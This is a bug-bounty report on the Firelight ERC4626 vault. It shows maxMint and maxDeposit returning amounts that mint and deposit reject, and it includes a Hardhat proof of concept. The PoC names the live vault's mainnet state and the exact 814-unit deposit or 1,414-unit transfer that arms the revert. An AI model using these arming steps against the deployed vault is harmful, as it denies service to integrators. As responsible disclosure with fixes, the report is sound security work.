# 88596 sc low firelightvault maxmint returns a share count that mint rejects and maxdeposit an asset amount that deposit rejects

**Submitted on Aug 14th 2026 at 02:18:06 UTC by @whitehorse for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88596
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

`maxMint` sizes the remaining deposit budget in converted share units and subtracts raw `totalSupply()`, while `mint` prices the same quantity back to assets with ceiling rounding and charges it against the same `depositLimit`. The two legs round in opposite directions, so `mint(maxMint(r), r)` reverts `DepositLimitExceeded`, which is exactly the outcome ERC4626 requires `maxMint` to prevent. Any unprivileged address forces that state on demand for a net cost of one base unit of FXRP, and it then denies the standard `mint(maxMint(self), self)` idiom to every caller until the next write of `totalSupply()` or `totalAssets()`. The sibling function fails the same way from a different cause: `deposit(maxDeposit(r), r)` reverts `InvalidAmount` once the remaining headroom falls below the share price.

## Vulnerability Details

Write `L = depositLimit`, `S = totalSupply()`, `A = totalAssets()`.

**Leg 1, `maxMint` at FirelightVault.sol:385 to :393.**

```solidity
uint256 shares = totalSupply();                          // :386  raw share units
uint256 sharesLimit = convertToShares(depositLimit);     // :387  assets to shares, Floor
...
return sharesLimit - shares;                             // :391  converted minus raw
```

`convertToShares` is not overridden, so `:387` floors, and `_decimalsOffset` is never defined, so the cushion is 1. The correct raw minus raw shape sits seven lines above at `maxDeposit:372` and `:376`.

`mint` never calls `super.mint`, so OpenZeppelin's own `maxMint` precheck is overridden away. It converts with `Math.Rounding.Ceil` at `:698` through `_convertToAssetsTotals:1073`, and `_depositFunds` enforces the budget:

```solidity
_totalAssets += assets;                                            // :985
if (_totalAssets > depositLimit) revert DepositLimitExceeded();    // :987
```

So `maxMint()` returns `floor(L * (S + 1) / (A + 1)) - S` and `mint` charges `ceil(m * (A + 1) / (S + 1))`. Comparing that against the correctly based `convertToShares(L - A)` gives an exact trigger and an exact bound, with `r = (L * (S + 1)) mod (A + 1)`:

```
maxMint() overstates by exactly 1 share base unit  <=>  r < A - S
```

The overstatement is one share unit at any share price, and the resulting overshoot past `depositLimit` is one asset base unit. `:987` compares with a strict `>`, so one unit is enough.

At Flare block 67,334,624 the closed form reproduces the live `maxMint()` return of 2,802,893,946,606 to the unit, and it does so at ten further blocks spanning 55 hours, which confirms the mixed basis and the cushion on the deployed artifact. The trigger is not satisfied at rest at any of those states: `r` is 56,644,815,406,212 against `A - S` of 4,126,715,962, an incidence of 7.1938e-5.

It is forced by choosing the size of an ordinary state write. `totalAssets():428` is the raw ERC20 balance minus `pendingWithdrawAssets`, so a deposit of 814 base units at that block moves the state into the trigger. The attacker keeps 813 shares that redeem for 813 assets, so the action costs one base unit of FXRP plus gas. Solved at eleven live states the amount ranges 213 to 13,442 base units and the net cost is one base unit at every one. A bare `FXRP.transfer(vault, d)` also works, at 379 to 22,118 base units, and runs no vault code at all since the vault declares neither `receive` nor `fallback`.

The forced state persists until any writer of `S` or `A` executes. Enumerating every such write over blocks 67,161,248 to 67,334,048 gives 97 writes in 55.04 hours, a median gap of 1,152 blocks, which is 22 minutes.

**Leg 2, `maxDeposit` at :371 to :378.** It returns `depositLimit - totalAssets()` with no floor to zero guard, while `deposit` rejects a deposit whose share count floors to zero:

```solidity
// A dust deposit can floor to zero shares once the share price exceeds 1;
// reject it instead of pulling assets in exchange for nothing.
if (shares == 0) revert InvalidAmount();                 // :669
```

so `deposit(maxDeposit(r), r)` reverts whenever `0 < L - A < (A + 1) / (S + 1)`. At the live share price of 1.000071943 that band is the single value `L - A == 1`; at a price of 3 it is `L - A` in {1, 2}. The true maximum `deposit` accepts in that band is zero. The guard at `:669` is the fix for 0xMacro finding L-1, "prevent zero-share deposits", commit `6806f35`, and `maxDeposit` was not brought along with it.

**Fix.** Compute each budget in the basis its entry point charges, and apply the same floor to zero rule:

```solidity
// maxMint
return convertToShares(depositLimit - totalAssets());
// maxDeposit
uint256 headroom = depositLimit - totalAssets();
return convertToShares(headroom) == 0 ? 0 : headroom;
```

`convertToShares` floors, so the share count prices back to at most the headroom under the ceiling rounding `mint` uses. Both changes are needed: fixing `maxMint` alone leaves leg 2 standing, and the proof of concept demonstrates that in its isolation arm.

`maxWithdraw`, `maxRedeem` and the four inherited preview functions were exercised against their entry points across the same scan and are consistent.

## Impact Details

While the forced state holds, the vault publishes a maximum mint size through its own ERC4626 view and then rejects a mint of exactly that size. `vault.mint(vault.maxMint(self), self)` composed in one call frame, the idiom the standard exists to make safe, reverts. The state is not caller specific and needs no front running: it sits in storage for a median of 22 minutes at the measured write rate and applies to every caller of that idiom for as long as it lasts. Arming it again costs one more base unit of FXRP. The same holds for `deposit(maxDeposit(self), self)` inside the headroom band, which exists only when the vault is at its cap, the state in which a caller has a reason to size a deposit off the view at all.

No funds move. `mint` reverts atomically before `_deposit` runs and `deposit` reverts before assets are pulled. A caller who does not trust the views can pass `maxMint() - 1`, and the proof of concept asserts that this succeeds at the same forced state. The attacker gains nothing: one base unit of FXRP worse plus gas on the deposit route, the whole amount given away irrecoverably on the transfer route, and nothing extracted from the vault or from any holder on either.

Leg 2 is 2,803,095,595,672 base units of headroom away from its condition at block 67,334,624, so it is carried for the completeness of the fix rather than as an independently reachable claim today. Leg 1 is reachable now.

The vault proxy `0x4C18Ff3C89632c3Dd62E796c0aFA5c07c4c1B2b3` currently runs the Phase 1 predeposit implementation `0x70ccF1bEe0C1217069fE74083Ca71Af7bcd7Fb76` at `contractVersion()` 1, which carries the identical `maxMint` body at `contracts/legacy/FirelightVaultPredeposits.sol:340` to `:348`. That is why the live reads above match the closed form. The in scope asset is the source at tag `v1_audit_ready`, commit `42f9ea5e43d88b35197b901acc2a8c24b314fa62`, and the proof of concept runs against that source.

The defect is the incorrect return value of two standard mandated functions rather than a loss of value, which is the in scope impact claimed: "Contract fails to deliver promised returns, but doesn't lose value."

## References

* `contracts/core/FirelightVault.sol:385` to `:393`, `maxMint`, and `:387`, `:391`, the mixed basis
* `contracts/core/FirelightVault.sol:371` to `:378`, `maxDeposit`, and `:376`, the unguarded headroom
* `contracts/core/FirelightVault.sol:665`, `:669`, the floor to zero conversion and the guard that rejects it
* `contracts/core/FirelightVault.sol:698`, `:985`, `:987`, the ceiling conversion and the budget enforcement
* `contracts/core/FirelightVault.sol:1064`, `:1073`, the two conversion helpers and the undefined `_decimalsOffset`
* `contracts/core/FirelightVault.sol:427` to `:429`, `totalAssets` as the raw balance minus `pendingWithdrawAssets`
* `contracts/core/interfaces/IFirelightVault.sol:14` to `:18`, the enumerated ERC4626 deviations, which cover the delayed withdraw and redeem semantics and the suppressed `Withdraw` event and neither of these
* `contracts/legacy/FirelightVaultPredeposits.sol:340` to `:348`, the identical body in the deployed implementation
* EIP-4626: `maxMint` "MUST NOT be higher than the actual maximum that would be accepted"; `maxDeposit` "MUST return the maximum amount of assets deposit would allow to be deposited for receiver and not cause a revert"
* 0xMacro Firelight A-1, finding L-1, "prevent zero-share deposits", commit `6806f35`

## Proof of Concept

```
// FirelightVault: the ERC-4626 max* views disagree with the functions they gate.
//
// EIP-4626 maxMint:    "MUST return the maximum amount of shares mint would allow to be deposited
//                       to receiver ... MUST NOT be higher than the actual maximum that would be
//                       accepted ... MUST NOT revert."
// EIP-4626 maxDeposit: "MUST return the maximum amount of assets deposit would allow to be
//                       deposited for receiver and not cause a revert."
//
// Two legs are demonstrated here, both on contracts/core/FirelightVault.sol.
//
//   LEG 1  maxMint:385-393 budgets in converted share units and subtracts raw totalSupply().
//          mint:698 prices the same nominal quantity back to assets with Math.Rounding.Ceil
//          (_convertToAssetsTotals:1073) and _depositFunds:987 rejects the result.
//          Reverts DepositLimitExceeded whenever  (L*(S+1)) mod (A+1)  <  A - S.
//          An unprivileged address puts the vault in that state on demand. Cheapest route
//          measured at the live state: one ordinary deposit of 814 base units, net cost to the
//          attacker 1 base unit of FXRP, because the shares received redeem for 813 of the 814.
//
//   LEG 2  maxDeposit:371-378 returns depositLimit - totalAssets() with no floor to zero guard.
//          deposit:670 rejects a deposit whose share count floors to zero. So maxDeposit()
//          returns a value deposit() refuses whenever  0 < depositLimit - totalAssets() < the
//          share price. That guard at :667-669 is the fix for 0xMacro finding L-1
//          ("prevent zero-share deposits", commit 6806f35); maxDeposit was not updated with it.
//
// maxWithdraw:401-412, maxRedeem:415-421 and the four inherited preview functions are exercised
// as negative controls in test 7 and hold.
//
// HOW TO RUN (harness supplied by the program, per the program page):
//     git clone https://github.com/immunefi-team/audit-comp-firelight.git
//     cd audit-comp-firelight && git checkout v1_audit_ready && npm install
//     cp <this file> test/poc_sub002_maxmint.js
//     npx hardhat test test/poc_sub002_maxmint.js
//
// ISOLATION CONTROL. Rewrite the body of maxMint at :386-391 to the same basis on both legs:
//     uint256 assets = totalAssets();
//     if (isBlocklisted[receiver] || paused() || _hasActiveIncident() || assets > depositLimit) {
//         return 0;
//     } else {
//         return convertToShares(depositLimit - assets);
//     }
// then run  FIXED=1 npx hardhat test test/poc_sub002_maxmint.js
// Tests 3, 4 and 5 invert. Test 6 is unchanged, which is the point: leg 2 is a separate defect
// and a fix to maxMint alone leaves it standing.
//
// No production contract is modified in the default arm. No role is granted. No time travel.
// No hook for tests only writes totalAssets() or totalSupply(). Every precondition is supplied by an
// actor that exists on mainnet today (see the ledger at the bottom of this file).

const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers')
const { deployVault } = require('./setup/fixtures.js')
const { expect } = require('chai')

const FIXED = process.env.FIXED === '1'

// ---------------------------------------------------------------------------------------
// Live mainnet state, Flare (chain id 14) block 67,334,624 (2026-08-13T20:24:36Z), vault
// proxy 0x4C18Ff3C89632c3Dd62E796c0aFA5c07c4c1B2b3, RPC https://flare-api.flare.network/ext/C/rpc.
// These are not round numbers and not the fixture defaults: they are what the 58,464,481.502553
// FXRP vault reads, so the arithmetic under test is the arithmetic running in production.
// ---------------------------------------------------------------------------------------
const L = 60_168_000_000_000n   // depositLimit()  60,168,000.000000 FXRP, 95.34 percent consumed
const S = 57_360_777_688_366n   // totalSupply()   57,360,777.688366 stXRP
const A = 57_364_904_404_328n   // totalAssets()   57,364,904.404328 FXRP
const PREMIUM = A - S           // 4,126,715,962 base units, share price 1.000071943

// Live maxMint() read at that block. The harness must reproduce it to the unit.
const MAXMINT_LIVE = 2_802_893_946_606n

// LEG 1 arming, route A: one ordinary deposit. Solved against the block 67,334,624 state.
const ARM_DEPOSIT = 814n            // assets the attacker deposits
const ARM_DEPOSIT_SHARES = 813n     // shares the attacker receives
const ARM_DEPOSIT_REDEEM_BACK = 813n // assets those shares redeem for, so net cost is 1 base unit
const MAXMINT_ARMED_DEP = 2_802_893_945_793n
const CHARGE_ARMED_DEP = 2_803_095_594_859n

// LEG 1 arming, route B: one bare ERC-20 transfer, no vault code executes.
const ARM_DONATION = 1_414n
const MAXMINT_ARMED_DON = 2_802_893_945_124n
const CHARGE_ARMED_DON = 2_803_095_594_259n

const VICTIM_FUNDS = 3_000_000_000_000n

// Reach the live (L, S, A) triple using only ordinary vault entry points.
//   arm: 'none' | 'deposit' | 'donation'
async function build(arm) {
  const ctx = await deployVault({ decimals: 6, initial_deposit_limit: L.toString() })
  const { token_contract, firelight_vault, users, utils } = ctx
  const [depositor, victim, attacker] = users

  // (1) Existing depositors. A first deposit of S mints exactly S shares under the cushion of 1
  //     and sets totalAssets() = S. Ordinary permissionless deposit().
  await utils.mintAndApprove(S, depositor)
  await firelight_vault.connect(depositor).deposit(S, depositor.address)

  // (2) Reward accrual, which puts totalAssets() above totalSupply() at the live premium.
  //     On mainnet VaultRewardDistributor supplies this. Here it is a plain transfer, which
  //     costs the attack nothing on mainnet and costs it money here. totalAssets():427-429 is
  //     super.totalAssets() minus pendingWithdrawAssets, so the raw balance lands in the basis.
  await utils.mintAndApprove(PREMIUM, depositor)
  await token_contract.connect(depositor).transfer(firelight_vault.target, PREMIUM)

  // (3) The victim: any ERC-4626 integrator that sizes a mint with maxMint().
  await utils.mintAndApprove(VICTIM_FUNDS, victim)

  // (4) The attacker: an ordinary funded EOA. No role, no allowlist, no prior interaction.
  if (arm === 'deposit') {
    await utils.mintAndApprove(ARM_DEPOSIT, attacker)
    await firelight_vault.connect(attacker).deposit(ARM_DEPOSIT, attacker.address)
  } else if (arm === 'donation') {
    await utils.mintAndApprove(ARM_DONATION, attacker)
    await token_contract.connect(attacker).transfer(firelight_vault.target, ARM_DONATION)
  }

  return { token_contract, firelight_vault, depositor, victim, attacker, utils }
}

async function liveState() { return build('none') }
async function armedByDeposit() { return build('deposit') }
async function armedByDonation() { return build('donation') }

describe('FirelightVault maxMint() and maxDeposit() return values their own entry points reject', function () {

  it('1. harness reproduces the live mainnet state, and maxMint() to the unit', async () => {
    const { firelight_vault } = await loadFixture(liveState)

    expect(await firelight_vault.depositLimit()).to.equal(L)
    expect(await firelight_vault.totalSupply()).to.equal(S)
    expect(await firelight_vault.totalAssets()).to.equal(A)

    // If this does not match the live read to the unit the state is not the state and nothing
    // below is evidence about mainnet. Under FIXED the value changes by construction.
    if (!FIXED) {
      expect(await firelight_vault.maxMint(ethers.ZeroAddress)).to.equal(MAXMINT_LIVE)
    }
  })

  it('2. unarmed, mint(maxMint()) succeeds', async () => {
    // Stated up front so nothing here reads as a claim that the vault is permanently broken.
    // At the live state (L*(S+1)) mod (A+1) = 56,644,815,406,212 and A - S = 4,126,715,962, so
    // the trigger is not satisfied. Unforced incidence is (A-S)/(A+1) = 7.1938e-5.
    const { firelight_vault, victim } = await loadFixture(liveState)

    const m = await firelight_vault.maxMint(victim.address)
    await expect(firelight_vault.connect(victim).mint(m, victim.address)).to.not.be.reverted
  })

  it('3. LEG 1 route A: one ordinary deposit of 814 base units, net cost 1 base unit, and mint(maxMint()) reverts', async () => {
    const { firelight_vault, victim, attacker } = await loadFixture(armedByDeposit)

    // The attacker is a depositor, not a donor. Their 814 base units bought 813 shares that
    // redeem for 813 base units, so the whole action costs them 1 base unit of FXRP plus gas.
    expect(await firelight_vault.balanceOf(attacker.address)).to.equal(ARM_DEPOSIT_SHARES)
    expect(await firelight_vault.previewRedeem(ARM_DEPOSIT_SHARES)).to.equal(ARM_DEPOSIT_REDEEM_BACK)
    expect(ARM_DEPOSIT - ARM_DEPOSIT_REDEEM_BACK).to.equal(1n)

    const m = await firelight_vault.maxMint(victim.address)
    if (FIXED) {
      // Isolation arm: the same basis maxMint returns one share less and mint accepts it.
      expect(m).to.equal(MAXMINT_ARMED_DEP - 1n)
      await expect(firelight_vault.connect(victim).mint(m, victim.address)).to.not.be.reverted
      console.log('        [FIXED] maxMint ' + MAXMINT_ARMED_DEP + ' -> ' + m + ', mint accepted')
      return
    }
    expect(m).to.equal(MAXMINT_ARMED_DEP)

    // The charge overshoots depositLimit by exactly one asset base unit, and :987 compares with
    // a strict comparison.
    expect(await firelight_vault.previewMint(m)).to.equal(CHARGE_ARMED_DEP)
    expect(CHARGE_ARMED_DEP + (A + ARM_DEPOSIT) - L).to.equal(1n)

    await expect(
      firelight_vault.connect(victim).mint(m, victim.address)
    ).to.be.revertedWithCustomError(firelight_vault, 'DepositLimitExceeded')
  })

  it('4. LEG 1 route B: one bare ERC-20 transfer of 1,414 base units, and mint(maxMint()) reverts', async () => {
    // Second, independent arming route. FirelightVault declares neither receive() nor fallback(),
    // so this executes entirely inside the FXRP token contract and no vault code runs. It is more
    // expensive than route A and it works while the caller is blocklisted or an incident is open.
    const { firelight_vault, victim } = await loadFixture(armedByDonation)

    const m = await firelight_vault.maxMint(victim.address)
    if (FIXED) {
      expect(m).to.equal(MAXMINT_ARMED_DON - 1n)
      await expect(firelight_vault.connect(victim).mint(m, victim.address)).to.not.be.reverted
      console.log('        [FIXED] maxMint ' + MAXMINT_ARMED_DON + ' -> ' + m + ', mint accepted')
      return
    }
    expect(m).to.equal(MAXMINT_ARMED_DON)
    expect(await firelight_vault.previewMint(m)).to.equal(CHARGE_ARMED_DON)
    expect(CHARGE_ARMED_DON + (A + ARM_DONATION) - L).to.equal(1n)

    await expect(
      firelight_vault.connect(victim).mint(m, victim.address)
    ).to.be.revertedWithCustomError(firelight_vault, 'DepositLimitExceeded')
  })

  it('5. LEG 1 bound: the overstatement is exactly one share base unit', async () => {
    // mint(maxMint() - 1) succeeds at the same armed state, which isolates the defect to the
    // final unit of the advertised maximum rather than to the fixture, the funding or the
    // approval, and bounds the error at one unit rather than leaving it open.
    const { firelight_vault, victim } = await loadFixture(armedByDeposit)

    const m = await firelight_vault.maxMint(victim.address)
    await expect(
      firelight_vault.connect(victim).mint(m - 1n, victim.address)
    ).to.not.be.reverted
  })

  it('6. LEG 2: deposit(maxDeposit()) reverts once the remaining headroom falls below the share price', async () => {
    // Permissionless setup. Ordinary deposits fill the vault to one base unit below depositLimit.
    // No role is used and depositLimit is never touched.
    const { firelight_vault, victim, utils, depositor } = await loadFixture(liveState)

    const headroomToLeave = 1n
    const fill = (await firelight_vault.maxDeposit(depositor.address)) - headroomToLeave
    await utils.mintAndApprove(fill, depositor)
    await firelight_vault.connect(depositor).deposit(fill, depositor.address)

    const A2 = await firelight_vault.totalAssets()
    const S2 = await firelight_vault.totalSupply()
    expect(L - A2).to.equal(1n)

    // The share price exceeds one, so one base unit of assets is worth zero shares.
    expect((A2 + 1n) > (S2 + 1n)).to.equal(true)
    expect(await firelight_vault.previewDeposit(1n)).to.equal(0n)

    // maxDeposit() advertises that one base unit anyway.
    const md = await firelight_vault.maxDeposit(victim.address)
    expect(md).to.equal(1n)

    await expect(
      firelight_vault.connect(victim).deposit(md, victim.address)
    ).to.be.revertedWithCustomError(firelight_vault, 'InvalidAmount')
    if (FIXED) console.log('        [FIXED] leg 2 unchanged: deposit(maxDeposit()) still reverts InvalidAmount')

    // Boundary: two base units is the smallest advertised amount deposit() accepts here, so the
    // rejected band is exactly  1 <= headroom < (A+1)/(S+1).
    expect(await firelight_vault.previewDeposit(2n)).to.equal(1n)
  })

  it('7. negative controls: maxWithdraw, maxRedeem and the four preview functions agree with their entry points', async () => {
    const { firelight_vault, victim, utils } = await loadFixture(armedByDeposit)

    // Give the victim a share balance through the ordinary mint path.
    const shares = 1_000_000n
    const cost = await firelight_vault.previewMint(shares)
    await utils.mintAndApprove(cost, victim)
    await firelight_vault.connect(victim).mint(shares, victim.address)

    const mw = await firelight_vault.maxWithdraw(victim.address)
    const pw = await firelight_vault.previewWithdraw(mw)
    expect(await firelight_vault.connect(victim).withdraw.staticCall(mw, victim.address, victim.address)).to.equal(pw)

    const mr = await firelight_vault.maxRedeem(victim.address)
    const pr = await firelight_vault.previewRedeem(mr)
    expect(mr).to.equal(await firelight_vault.balanceOf(victim.address))
    expect(await firelight_vault.connect(victim).redeem.staticCall(mr, victim.address, victim.address)).to.equal(pr)

    // previewDeposit and previewMint against their own entry points at the same state.
    const probeAssets = 1_000_000n
    await utils.mintAndApprove(probeAssets, victim)
    expect(await firelight_vault.connect(victim).deposit.staticCall(probeAssets, victim.address))
      .to.equal(await firelight_vault.previewDeposit(probeAssets))

    const probeShares = 1_000_000n
    const need = await firelight_vault.previewMint(probeShares)
    await utils.mintAndApprove(need, victim)
    expect(await firelight_vault.connect(victim).mint.staticCall(probeShares, victim.address)).to.equal(need)
  })
})

// ---------------------------------------------------------------------------------------
// Who supplies each precondition on mainnet
//
//   harness action                     | supplied on mainnet by
//   -----------------------------------+-------------------------------------------------
//   deposit(S, depositor)              | ordinary depositors; this state already exists
//   transfer(vault, A - S)             | VaultRewardDistributor; the premium is already live
//   deposit(814) or transfer(1414)     | THE ATTACKER, an ordinary EOA with no role and no
//                                      | allowlist. Route A nets 1 base unit of FXRP.
//   fill to headroom 1 (test 6)        | ordinary depositors, no role, depositLimit untouched
//   maxMint(r) / mint(shares, r)       | the victim integrator; both permissionless
//
// Deviations from mainnet, each attacker neutral or attacker adverse:
//   1. Mock 6-decimal FXRP rather than 0xAd552A648C74D49E10027AB8a618A3ad4901c5bE. Neutral, since the
//      vault reads only balanceOf and transferFrom, and FXRP is a plain 6-decimal ERC-20.
//   2. The share price premium is established by a transfer rather than by VaultRewardDistributor.
//      Neutral on the arithmetic, since totalAssets() is the raw balance either way, and
//      adverse to the attacker on cost.
//   3. Test 6 fills 2,803,095.595671 FXRP of headroom that is already filled on a vault at its
//      cap. That is the reachability limit of leg 2 and it is stated in the report.
//   4. Nothing else. No production line edited in the default arm, no role used, no setter for tests only
//     .
//
// Recommended fix, both legs, in the basis each entry point actually charges:
//
//     function maxDeposit(address receiver) public view override returns (uint256 amount) {
//         uint256 assets = totalAssets();
//         if (isBlocklisted[receiver] || paused() || _hasActiveIncident() || assets > depositLimit) return 0;
//         uint256 headroom = depositLimit - assets;
//         return convertToShares(headroom) == 0 ? 0 : headroom;
//     }
//
//     function maxMint(address receiver) public view override returns (uint256 amount) {
//         uint256 assets = totalAssets();
//         if (isBlocklisted[receiver] || paused() || _hasActiveIncident() || assets > depositLimit) return 0;
//         return convertToShares(depositLimit - assets);
//     }
//
// convertToShares floors, so the share count maxMint returns prices back to at most
// depositLimit - totalAssets() under the Ceil rounding mint uses, and :987 cannot trip on the
// vault's own advertised maximum. Checked at the armed state: charge 2,803,095,594,857 against
// headroom 2,803,095,594,858.
// ---------------------------------------------------------------------------------------
```
